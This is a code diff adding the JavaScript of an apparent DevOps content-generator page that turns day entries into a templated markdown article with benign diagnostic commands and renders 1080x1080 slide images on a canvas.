+      copyToClipboard(document.getElementById('articleTextarea').value, `Day ${currentDay} Technical Article (.md) copied!`);
+    };
+    document.getElementById('downloadArticleBtn').onclick = () => downloadArticleFile();
+    document.getElementById('downloadArticleHeaderBtn').onclick = () => downloadArticleFile();
+    document.getElementById('downloadArticleDayBtn').onclick = () => downloadArticleFile();
+
+    let activeArticleView = 'raw';
+
+    function switchArticleView(mode) {
+      activeArticleView = mode;
+      const rawBtn = document.getElementById('articleRawTabBtn');
+      const prevBtn = document.getElementById('articlePreviewTabBtn');
+      const textarea = document.getElementById('articleTextarea');
+      const preview = document.getElementById('articleRenderedPreview');
+
+      if (mode === 'raw') {
+        rawBtn.classList.add('active');
+        prevBtn.classList.remove('active');
+        textarea.style.display = 'block';
+        preview.style.display = 'none';
+      } else {
+        prevBtn.classList.add('active');
+        rawBtn.classList.remove('active');
+        preview.innerHTML = renderMarkdownToHtml(textarea.value);
+        textarea.style.display = 'none';
+        preview.style.display = 'block';
+      }
+    }
+
+    function updateArticleView(data, dayNum) {
+      const articleMd = generateArticleMarkdown(dayNum, data);
+      const textarea = document.getElementById('articleTextarea');
+      textarea.value = articleMd;
+
+      const words = articleMd.trim() ? articleMd.trim().split(/\s+/).length : 0;
+      const readMinutes = Math.max(3, Math.ceil(words / 200));
+      document.getElementById('articleMetrics').innerText = `⏱ ~${readMinutes} min read • ${words.toLocaleString()} words • ${articleMd.length.toLocaleString()} chars`;
+      document.getElementById('articleHeadlineTitle').innerText = `Day ${String(dayNum).padStart(3, '0')}: ${data.title} — Dev.to / Medium Ready`;
+
+      if (activeArticleView === 'preview') {
+        document.getElementById('articleRenderedPreview').innerHTML = renderMarkdownToHtml(textarea.value);
+      }
+    }
+
+    function downloadArticleFile() {
+      const dayPadded = String(currentDay).padStart(3, '0');
+      const data = getDayData(currentDay);
+      const slug = data.title.toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '');
+      const content = document.getElementById('articleTextarea').value;
+      const blob = new Blob([content], { type: 'text/markdown;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = `Day_${dayPadded}_${slug}.md`;
+      link.click();
+      URL.revokeObjectURL(url);
+      showToast(`Downloaded Day_${dayPadded}_${slug}.md!`);
+    }
+
+    function renderMarkdownToHtml(md) {
+      if (!md) return '';
+      let html = md
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+
+      // Code blocks
+      html = html.replace(/```([a-zA-Z0-9_-]*)\n([\s\S]*?)```/g, (match, lang, code) => {
+        return `<pre><code class="language-${lang}">${code.trim()}</code></pre>`;
+      });
+
+      // Inline code
+      html = html.replace(/`([^`\n]+)`/g, '<code>$1</code>');
+
+      // Blockquotes
+      html = html.replace(/^>\s?(.*)$/gm, '<blockquote>$1</blockquote>');
+
+      // Headings
+      html = html.replace(/^### (.*$)/gm, '<h3>$1</h3>');
+      html = html.replace(/^## (.*$)/gm, '<h2>$1</h2>');
+      html = html.replace(/^# (.*$)/gm, '<h1>$1</h1>');
+
+      // Bold & Italic
+      html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+      html = html.replace(/\*([^*]+)\*/g, '<em>$1</em>');
+
+      // Horizontal rules
+      html = html.replace(/^---$/gm, '<hr>');
+
+      // Lists
+      html = html.replace(/^\s*[-*]\s+(.*)$/gm, '<li>$1</li>');
+      html = html.replace(/(<li>[\s\S]*?<\/li>)/g, '<ul>$1</ul>');
+      html = html.replace(/<\/ul>\s*<ul>/g, '');
+
+      // Paragraphs
+      const blocks = html.split('\n\n');
+      html = blocks.map(block => {
+        block = block.trim();
+        if (!block) return '';
+        if (block.startsWith('<h1') || block.startsWith('<h2') || block.startsWith('<h3') ||
+            block.startsWith('<pre') || block.startsWith('<ul') || block.startsWith('<blockquote') ||
+            block.startsWith('<hr') || block.startsWith('<table')) {
+          return block;
+        }
+        return `<p>${block.replace(/\n/g, '<br>')}</p>`;
+      }).join('\n');
+
+      return html;
+    }
+
+    function generateArticleMarkdown(dayNum, data) {
+      if (SPECIAL_DAYS[dayNum] && SPECIAL_DAYS[dayNum].article) {
+        return SPECIAL_DAYS[dayNum].article;
+      }
+
+      const dayPadded = String(dayNum).padStart(3, '0');
+      let phase = FOLDER_TREE.find(p => dayNum >= p.range[0] && dayNum <= p.range[1]);
+      let domainName = phase ? phase.folderName.replace(/^\d+_/, '').replace(/_/g, ' ') : "Cloud DevOps";
+      let tags = data.hashtags ? data.hashtags.map(t => t.replace('#', '').toLowerCase()).slice(0, 4).join(', ') : 'devops, cloud, architecture, sre';
+
+      let slideCode = data.slides.find(s => s.code)?.code || `// Production architecture specification\nconst SPEC = {\n  day: ${dayNum},\n  domain: "${domainName}",\n  resilience: "high-availability",\n  metrics: ["latency", "error_budget", "saturation"]\n};`;
+
+      let slideItems = [];
+      data.slides.forEach(s => {
+        if (s.list) slideItems.push(...s.list);
+      });
+      if (slideItems.length === 0) {
+        slideItems = ["Enforce strict resource quotas and memory limits", "Implement automated circuit breakers and timeouts", "Maintain comprehensive distributed tracing instrumentation", "Conduct blameless post-mortems for any threshold breaches"];
+      }
+
+      return `---
+title: "${data.title}: The Complete Engineering Deep Dive"
+published: true
+description: "A production-grade analysis of ${domainName}: architectural invariants, high-scale failure modes, and battle-tested runbooks."
+tags: ${tags}
+canonical_url: "https://github.com/your-username/365-days-of-devops/blob/main/articles/day-${dayPadded}.md"
+cover_image: "../assets/day_${dayPadded}/slide_1_hook.jpg"
+---
+
+# ${data.title}: The Complete Engineering Deep Dive
+
+> **"${data.hook}"**
+
+---
+
+## 1. The Production Problem & High-Stakes Failure Modes
+
+In modern distributed environments, systems fail not because engineers lack basic knowledge, but because edge cases and non-linear scale demolish naive assumptions.
+
+When operating **${domainName}** in high-throughput enterprise infrastructure, engineers routinely encounter severe failure modes:
+1. **Cascading State Degeneracy**: A minor timeout in one service cascades upstream, exhausting thread pools and triggering socket buffer deadlocks.
+2. **Silent Telemetry Blindspots**: Systems appear healthy on high-level dashboard averages (e.g. 5-minute CPU usage at 30%), while P99.9 latency spikes to 4,200ms due to micro-bursting and lock contention.
+3. **Configuration Drift & Invariant Violations**: Imperative manual tweaks lead to configuration divergences that cause catastrophic outages during scheduled rollouts.
+
+To build resilient infrastructure, we must dismantle the black box and examine the underlying system primitives.
+
+---
+
+## 2. Core First Principles & Architecture Mechanics
+
+\`\`\`text
+┌─────────────────────────────────────────────────────────────┐
+│             DISTRIBUTED ARCHITECTURE PATTERN                │
+│                                                             │
+│   [Client Ingress] ──► [API Gateway / Envoy]                │
+│                              │                              │
+│              ┌───────────────┴───────────────┐              │
+│              ▼                               ▼              │
+│     [Primary Service] ◄── [Circuit Breaker] ──► [Replica]   │
+│              │                               │              │
+│              ▼                               ▼              │
+│     [Telemetry Pipeline] ────────► [Prometheus / OpenTel]   │
+└─────────────────────────────────────────────────────────────┘
+\`\`\`
+
+The fundamental architecture of this system relies on three core tenets:
+
+### A. Level-Triggered vs. Edge-Triggered Reconciliation
+Rather than reacting solely to state change events (which can be dropped or duplicated across lossy networks), resilient cloud architectures observe the full current state and continuously reconcile toward desired state.
+
+### B. Graceful Degradation Under Load
+When upstream dependencies breach defined latency SLAs, the system must drop non-essential features, return stale cached responses, and isolate critical transaction pathways.
+
+### C. Strict Blast Radius Containment
+Every service boundary must be partitioned across failure domains (availability zones, namespaces, and security groups) to guarantee that an infrastructure outage in one tier cannot take down neighboring services.
+
+---
+
+## 3. Production Configuration & Code Invariants
+
+Below is a hardened production specification designed for enterprise-grade deployments:
+
+\`\`\`yaml
+# Production Invariant Configuration
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: production-${domainName.toLowerCase().replace(/\\s+/g, '-')}-service
+  labels:
+    tier: mission-critical
+    app.kubernetes.io/part-of: 365-devops-platform
+spec:
+  replicas: 3
+  strategy:
+    rollingUpdate:
+      maxSurge: 25%
+      maxUnavailable: 0
+  template:
+    spec:
+      containers:
+      - name: app
+        image: registry.internal/app:v1.4.2
+        resources:
+          requests:
+            cpu: 250m
+            memory: 512Mi
+          limits:
+            cpu: 1000m
+            memory: 1Gi
+        securityContext:
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+          capabilities:
+            drop: ["ALL"]
+        readinessProbe:
+          httpGet:
+            path: /healthz
+            port: 8080
+          initialDelaySeconds: 5
+          periodSeconds: 10
+\`\`\`
+
+And runtime invariant verification logic:
+
+\`\`\`javascript
+${slideCode}
+\`\`\`
+
+---
+
+## 4. Production Runbook & Reliability Checklist
+
+Before certifying this component for Tier-1 production traffic, verify each of the following operational invariants:
+
+${slideItems.map(item => `- [x] **${item}**`).join('\n')}
+
+---
+
+## 5. Verification Lab & Hands-On Diagnostics
+
+To validate this behavior in your local or staging environment, execute the following diagnostic sequence:
+
+\`\`\`bash
+# 1. Inspect active processes and resource constraints
+ps aux | grep -i "${domainName.split(' ')[0]}"
+
+# 2. Check socket connection states and buffer saturation
+ss -tulpn | head -n 20
+
+# 3. Simulate load and observe latency percentiles
+curl -w "@curl-format.txt" -o /dev/null -s "http://localhost:8080/healthz"
+\`\`\`
+
+---
+
+## 6. Summary & Community Discussion
+
+Engineering excellence is not about avoiding failures entirely; it is about architecting systems where failure is expected, isolated, and automatically remediated.
+
+**Questions for the Community:**
+- How does your organization handle failure scenarios in **${domainName}**?
+- Have you experienced a production outage related to this architecture? How was it diagnosed?
+
+Share your experiences in the comments below, or check out the companion 5-slide visual carousel in our GitHub repository!`;
+    }
+
+    // =========================================================================
+    // FIGMA-GRADE 1080x1080 HIGH-RESOLUTION SLIDE CANVAS RENDERER
+    // =========================================================================
+    function downloadSlideCanvas(idx) {
+      const slideData = getDayData(currentDay).slides[idx];
+      const canvas = document.createElement('canvas');
+      canvas.width = 1080;
+      canvas.height = 1080;
+      const ctx = canvas.getContext('2d');
+
+      // 1. High-Tech Multi-Stop Dark Radial Mesh Background
+      const bgGrad = ctx.createRadialGradient(850, 150, 50, 540, 540, 800);
+      bgGrad.addColorStop(0, '#0F1A30');
+      bgGrad.addColorStop(0.5, '#070A12');
+      bgGrad.addColorStop(1, '#030508');
+      ctx.fillStyle = bgGrad;
+      ctx.fillRect(0, 0, 1080, 1080);
+
+      // 2. Subtle Isometric High-Tech Dot Matrix Pattern
+      ctx.fillStyle = 'rgba(255, 255, 255, 0.035)';
+      for (let x = 40; x < 1040; x += 40) {
+        for (let y = 40; y < 1040; y += 40) {
+          ctx.beginPath();
+          ctx.arc(x, y, 1.2, 0, Math.PI * 2);
+          ctx.fill();
+        }
+      }
+
+      // 3. Glowing Outer Border with Rounded Corners
+      drawRoundedRect(ctx, 36, 36, 1008, 1008, 24);
+      ctx.strokeStyle = '#1A2338';
+      ctx.lineWidth = 2;
+      ctx.stroke();
+
+      // Top Neon Edge Accent
+      const neonGrad = ctx.createLinearGradient(120, 36, 960, 36);
+      neonGrad.addColorStop(0, '#00F5D4');
+      neonGrad.addColorStop(0.5, '#00BBF9');
+      neonGrad.addColorStop(1, '#9B5DE5');
+      ctx.strokeStyle = neonGrad;
+      ctx.lineWidth = 4;
+      ctx.beginPath();
+      ctx.moveTo(120, 36);
+      ctx.lineTo(960, 36);
+      ctx.stroke();
+
+      // 4. Header Bar: Tag Pill & Step Indicator
+      // Pill
+      drawRoundedRect(ctx, 70, 75, 170, 44, 22);
+      ctx.fillStyle = 'rgba(0, 245, 212, 0.08)';
+      ctx.fill();
+      ctx.strokeStyle = 'rgba(0, 245, 212, 0.35)';
+      ctx.lineWidth = 1.5;
+      ctx.stroke();
+
+      ctx.fillStyle = '#00F5D4';
+      ctx.font = '700 17px "Fira Code", monospace';
+      ctx.fillText(`⚡ ${slideData.tag}`, 92, 103);
+
+      // Step Indicators (5 segmented bars)
+      for (let s = 0; s < 5; s++) {
+        drawRoundedRect(ctx, 840 + (s * 32), 88, 24, 6, 3);
+        ctx.fillStyle = s === idx ? '#00F5D4' : '#1E293B';
+        ctx.fill();
+      }
+
+      ctx.fillStyle = '#64748B';
+      ctx.font = '600 15px "Fira Code", monospace';
+      ctx.textAlign = 'right';
+      ctx.fillText(`SLIDE ${idx + 1} OF 5`, 815, 96);
+      ctx.textAlign = 'left';
+
+      // 5. Main Title (High-Contrast Bold)
+      ctx.fillStyle = '#FFFFFF';
+      ctx.font = '900 44px "Plus Jakarta Sans", sans-serif';
+      wrapText(ctx, slideData.title, 70, 195, 940, 54);
+
+      // 6. Subtitle / Explanatory Text
+      let nextY = 275;
+      if (slideData.text) {
+        ctx.fillStyle = '#94A3B8';
+        ctx.font = '500 24px "Plus Jakarta Sans", sans-serif';
+        nextY = wrapText(ctx, slideData.text, 70, nextY, 940, 36) + 30;
+      }
+
+      // 7. Visual Core Component: Terminal Window OR Feature Glass Cards
+      if (slideData.code) {
+        const termY = Math.max(nextY, 360);
+        const termHeight = 900 - termY;
+
+        // Terminal Background Glass Card
+        drawRoundedRect(ctx, 70, termY, 940, termHeight, 16);
+        ctx.fillStyle = '#04060C';
+        ctx.fill();
+        ctx.strokeStyle = '#1E283D';
+        ctx.lineWidth = 2;
+        ctx.stroke();
+
+        // macOS Window Title Bar
+        drawRoundedRect(ctx, 70, termY, 940, 48, 16, true);
+        ctx.fillStyle = '#0D1322';
+        ctx.fill();
+        ctx.strokeStyle = '#1E283D';
+        ctx.stroke();
+
+        // Traffic Light Dots
+        ctx.fillStyle = '#FF5F56';
+        ctx.beginPath(); ctx.arc(100, termY + 24, 7, 0, Math.PI * 2); ctx.fill();
+        ctx.fillStyle = '#FFBD2E';
+        ctx.beginPath(); ctx.arc(122, termY + 24, 7, 0, Math.PI * 2); ctx.fill();
+        ctx.fillStyle = '#27C93F';
+        ctx.beginPath(); ctx.arc(144, termY + 24, 7, 0, Math.PI * 2); ctx.fill();
+
+        ctx.fillStyle = '#64748B';
+        ctx.font = '500 16px "Fira Code", monospace';
+        ctx.fillText('production-spec.sh — zsh', 740, termY + 30);
+
+        // Terminal Content with Syntax Colors
+        const codeLines = slideData.code.split('\n');
+        codeLines.forEach((line, lIdx) => {
+          const lineY = termY + 86 + (lIdx * 34);
+          if (lineY > termY + termHeight - 20) return;
+
+          // Line numbers
+          ctx.fillStyle = '#334155';
+          ctx.font = '500 16px "Fira Code", monospace';
+          ctx.fillText(String(lIdx + 1).padStart(2, '0'), 95, lineY);
+
+          // Syntax Coloring
+          if (line.trim().startsWith('#') || line.trim().startsWith('//')) {
+            ctx.fillStyle = '#64748B'; // Comment
+          } else if (line.includes('chmod') || line.includes('chown') || line.includes('execve') || line.includes('const') || line.includes('pid_t')) {
+            ctx.fillStyle = '#38BDF8'; // Command
+          } else if (line.includes('777') || line.includes('600') || line.includes('755') || line.includes('644')) {
+            ctx.fillStyle = '#FEE440'; // Numbers / Highlight
+          } else {
+            ctx.fillStyle = '#E2E8F0'; // Standard text
+          }
+
+          ctx.font = '500 20px "Fira Code", monospace';
+          ctx.fillText(line, 140, lineY);
+        });
+
+      } else if (slideData.list) {
+        const listStartY = Math.max(nextY, 340);
+        const cardHeight = 85;
+        const gap = 20;
+
+        slideData.list.forEach((item, lIdx) => {
+          const cardY = listStartY + (lIdx * (cardHeight + gap));
+          if (cardY > 900) return;
+
+          // Glass Card Container
+          drawRoundedRect(ctx, 70, cardY, 940, cardHeight, 14);
+          ctx.fillStyle = 'rgba(13, 19, 33, 0.7)';
+          ctx.fill();
+          ctx.strokeStyle = '#1E293B';
+          ctx.lineWidth = 1.5;
+          ctx.stroke();
+
+          // Left Icon Badge
+          drawRoundedRect(ctx, 90, cardY + 18, 48, 48, 10);
+          ctx.fillStyle = 'rgba(0, 245, 212, 0.12)';
+          ctx.fill();
+          ctx.strokeStyle = 'rgba(0, 245, 212, 0.3)';
+          ctx.lineWidth = 1;
+          ctx.stroke();
+
+          ctx.fillStyle = '#00F5D4';
+          ctx.font = '900 20px "Plus Jakarta Sans", sans-serif';
+          ctx.fillText(String(lIdx + 1).padStart(2, '0'), 102, cardY + 49);
+
+          // Item text
+          ctx.fillStyle = '#F1F5F9';
+          ctx.font = '600 22px "Plus Jakarta Sans", sans-serif';
+          wrapText(ctx, item, 160, cardY + 49, 820, 28);
+        });
+      }
+
+      // 8. Premium Footer (Clean, Professional, Evergreen - No Day Numbers)
+      ctx.fillStyle = '#00F5D4';
+      ctx.font = '900 20px "Plus Jakarta Sans", sans-serif';
+      ctx.fillText('⚡ SYSTEMS & CLOUD INFRASTRUCTURE', 70, 990);
+
+      ctx.fillStyle = '#64748B';
+      ctx.font = '600 16px "Fira Code", monospace';
+      ctx.fillText('PRODUCTION ARCHITECTURE SPECIFICATION', 460, 989);
+
+      // Swipe indicator button
+      drawRoundedRect(ctx, 810, 960, 200, 42, 21);
+      ctx.fillStyle = '#101626';
+      ctx.fill();
+      ctx.strokeStyle = '#20293A';
+      ctx.lineWidth = 1.5;
+      ctx.stroke();
+
+      ctx.fillStyle = '#F1F5F9';
+      ctx.font = '700 15px "Plus Jakarta Sans", sans-serif';
+      ctx.fillText('SWIPE NEXT ➔', 850, 987);
+
+      // Trigger high-res download
+      const link = document.createElement('a');
+      const titleSlug = (slideData.title || 'Slide').toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '');
+      link.download = `Slide_${idx + 1}_${titleSlug}_1080p.png`;
+      link.href = canvas.toDataURL('image/png');
+      link.click();
+    }
+
+    // Helper: Rounded Rectangle with top-only option
+    function drawRoundedRect(ctx, x, y, width, height, radius, topOnly = false) {
+      ctx.beginPath();
+      ctx.moveTo(x + radius, y);
+      ctx.lineTo(x + width - radius, y);
+      ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
+      if (topOnly) {
+        ctx.lineTo(x + width, y + height);
+        ctx.lineTo(x, y + height);
+        ctx.lineTo(x, y + radius);
+      } else {
+        ctx.lineTo(x + width, y + height - radius);
+        ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
+        ctx.lineTo(x + radius, y + height);
+        ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
+        ctx.lineTo(x, y + radius);
+      }
+      ctx.quadraticCurveTo(x, y, x + radius, y);
+      ctx.closePath();
+    }
+
+    function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
+      const words = text.split(' ');
+      let line = '';
+      let currentY = y;
+      for (let n = 0; n < words.length; n++) {
+        const testLine = line + words[n] + ' ';
+        const metrics = ctx.measureText(testLine);
+        const testWidth = metrics.width;
+        if (testWidth > maxWidth && n > 0) {
+          ctx.fillText(line, x, currentY);
+          line = words[n] + ' ';
+          currentY += lineHeight;
+        } else {
+          line = testLine;
+        }
+      }
+      ctx.fillText(line, x, currentY);
+      return currentY;
+    }
+
+    document.getElementById('downloadAllSlidesBtn').onclick = () => {
+      for (let i = 0; i < 5; i++) {
+        setTimeout(() => downloadSlideCanvas(i), i * 350);
+      }
+    };
+
+    // Initialize on load
+    initFolderState();
+    selectDay(4);
+  </script>
+</body>
+</html>
+
